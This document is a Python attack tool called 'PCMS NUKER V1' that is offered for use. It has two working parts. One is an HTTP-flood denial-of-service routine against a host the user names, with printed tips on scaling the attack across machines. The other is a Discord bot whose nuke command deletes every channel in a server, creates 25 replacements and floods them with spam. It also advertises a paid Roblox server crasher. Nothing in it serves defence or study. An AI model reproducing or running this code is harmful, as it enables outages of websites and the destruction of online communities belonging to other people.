"""
 _______   ______  __       __  ______  
|       \ /      \|  \     /  \/      \ 
| ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\ ▓▓\   /  ▓▓  ▓▓▓▓▓▓\
| ▓▓__/ ▓▓ ▓▓   \▓▓ ▓▓▓\ /  ▓▓▓ ▓▓___\▓▓
| ▓▓    ▓▓ ▓▓     | ▓▓▓▓\  ▓▓▓▓\▓▓    \ 
| ▓▓▓▓▓▓▓| ▓▓   __| ▓▓\▓▓ ▓▓ ▓▓_\▓▓▓▓▓▓\
| ▓▓     | ▓▓__/  \ ▓▓ \▓▓▓| ▓▓  \__| ▓▓
| ▓▓      \▓▓    ▓▓ ▓▓  \▓ | ▓▓\▓▓    ▓▓
 \▓▓       \▓▓▓▓▓▓ \▓▓      \▓▓ \▓▓▓▓▓▓ 
                                        
                                        
PCMS NUKER V1
"""


import os
# define packages , if nor either install or run normally
try:
    import asyncio
    import colorama
    import discord
    import socket
# if module isn't exist on pc then install.
except ModuleNotFoundError:
    print("Installing Packages...")
    # os method
    os.system("pip install asyncio")
    os.system("pip install colorama")
    os.system("pip install discord")
    os.system("pip install socket")
    print("Reopen This File if it dosen't loaded now.")

from discord.ext import commands
from pystyle import *
from colorama import Fore,Style
from random import choice
from modules.user_agents import user_agents
from modules.clear_scr import clear_scr


intents = discord.Intents.all()


#pcms logo
os.system('cls')

#on icon define.
def icon():
    Write.Print("""
    
        ██████╗  ██████╗███╗   ███╗███████╗
        ██╔══██╗██╔════╝████╗ ████║██╔════╝
        ██████╔╝██║     ██╔████╔██║███████╗
        ██╔═══╝ ██║     ██║╚██╔╝██║╚════██║
        ██║     ╚██████╗██║ ╚═╝ ██║███████║
        ╚═╝      ╚═════╝╚═╝     ╚═╝╚══════╝
                     
                     MADE BY lynoraid#0                   
                PCMS NUKER V1
                [[More Feautres Soon ! ( No Guild and Nick changer )]]
    
    """,Colors.red_to_blue,interval=0.0000)
icon()
def dos(host):
    clear_scr()
    icon()
    print(Fore.LIGHTRED_EX+"[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n")
    print(Fore.GREEN+"[*]Host to attack: "+host)
    ip = socket.gethostbyname(host)
    print(Fore.RED+"[*]IP of the host: "+ip+"\n\n")
    conn = input(
        "Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
    conn = int(conn)
    os.system('cls')
    Write.Print(f"""
                        ██╗     ██╗   ██╗███╗   ██╗ ██████╗ 
                        ██║     ╚██╗ ██╔╝████╗  ██║██╔═══██╗
                        ██║      ╚████╔╝ ██╔██╗ ██║██║   ██║
                        ██║       ╚██╔╝  ██║╚██╗██║██║   ██║
                        ███████╗   ██║   ██║ ╚████║╚██████╔╝
                        ╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝ 
                        

            ███████╗███████╗██████╗ ██╗   ██╗██╗ ██████╗███████╗███████╗
            ██╔════╝██╔════╝██╔══██╗██║   ██║██║██╔════╝██╔════╝██╔════╝
            ███████╗█████╗  ██████╔╝██║   ██║██║██║     █████╗  ███████╗
            ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██║     ██╔══╝  ╚════██║
            ███████║███████╗██║  ██║ ╚████╔╝ ██║╚██████╗███████╗███████║
            ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝ ╚═════╝╚══════╝╚══════╝
                             https://dsc.gg/lyno
                             SRC:
                             \n\n{user_agents}
    
    """,Colors.red_to_purple,interval=0.0000)
    for i in range(conn):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print("Unable to create Socket. Retrying.")
            continue
        try:
            s.connect((ip, 80))
        except:
            print("Unable To Connect. Retrying.")
            continue
        Write.Print(f"\n> Bot Crashing , Status : Crashed {i}",Colors.cyan_to_blue,interval = 0.0000)
        s.send("GET / HTTP/1.1\r\n".encode())
        s.send("Host: ".encode()+host.encode()+"\r\n".encode())
        s.send("User-Agent: ".encode() +
               choice(user_agents).encode()+"\r\n\r\n".encode())
        s.close()
        Write.Print("\n > Attacked Successfully !",Colors.blue_to_green,interval=0.0000)

"""
Discord Nuker

"""
def nuker():
    #on start
    icon()
    token = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Token:")
    prefix = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Prefix:")
    channelname = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Spamming Channel name:")
    spammsg = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Spamming Message:")
    amount = int(input(Fore.LIGHTGREEN_EX+"\n > Enter The Amount Of Message Spamming (etc : 10 [ Number Accepted Only]) "))
    bot = commands.Bot(command_prefix=prefix, intents=intents)

    # Event that runs when the bot is ready
    @bot.event
    async def on_ready():
        os.system('cls')
        icon()
        await bot.change_presence(status=discord.Status.dnd)
        Write.Print(f'\nLogged in as {bot.user.name} ({bot.user.id})',Colors.red_to_blue,interval=0.0000)
        Write.Print(f"\n Commands : \n {prefix}nuke",Colors.red_to_blue,interval=0.0000)


    # NUKE COMMAND BY LYNO ( trash)
    @bot.command()
    async def nuke(ctx):
        os.system('cls')
        icon()
        Write.Print(f'\nLogged in as {bot.user.name} ({bot.user.id})',Colors.red_to_blue,interval=0.0000)
        Write.Print(f"\n Commands : \n {prefix}nuke",Colors.red_to_blue,interval=0.0000)
        await ctx.message.delete()
        guild = ctx.guild
        channels = guild.channels
        for channel in channels:
            await channel.delete()
            Write.Print("\n > Deleted Channel",Colors.red_to_blue,interval=0.0000)
        Write.Print("\n > Deleted All Channels !",Colors.blue_to_green,interval=0.0000)

        for _ in range(25):
            await guild.create_text_channel(name=channelname)
            Write.Print("\n > Created Channel",Colors.red_to_blue,interval=0.0000)
        Write.Print("\n > Created All Channels",Colors.blue_to_green,interval=0.0000)

        for channel in guild.text_channels:
            for _ in range(amount):
                await channel.send(spammsg)
                Write.Print("\n > Message Sent",Colors.red_to_blue,interval=0.0000)
        Write.Print("\n > Finished Spam !",Colors.blue_to_green,interval=0.0000)
        Write.Print(f"\n Server <{guild}> Is Nuked !",Colors.blue_to_green,interval=0.0000)

    @bot.event
    async def on_command_error(ctx, error):
        if isinstance(error, commands.CommandNotFound):
            return  
        raise error

    try:
        bot.run(token)
    except discord.errors.LoginFailure:
        print(Fore.RED+"\n > Bot Token Isn't Found !")
def choose():
    Write.Print("\t[1] Ddos \t[2] Discord Nuker \t[3] Roblox Server Crasher",Colors.red_to_blue,interval=0.0000)
    choice = input(Fore.CYAN+"\nEnter Your Choice :")
    if choice == "1":
        os.system("cls")
        icon()
        host = input(Fore.RED+"Please Input the host : ( www.google.com etc...)")
        dos(host)
    elif choice == "2":
        os.system("cls")
        nuker()
    elif choice == "3":
        os.system("cls")
        icon()
        Write.Print("Awwwww it costs money , buy it at discord.gg/AE32JSDweA",Colors.blue_to_purple,interval = 0.0025)
        input()
        exit()
        # quit it boi
    else:
        Write.Print("Invaild Input Please Try Again",Colors.red_to_blue,interval=0.0000)
        os.system("cls")
        icon()
        choose()
choose()

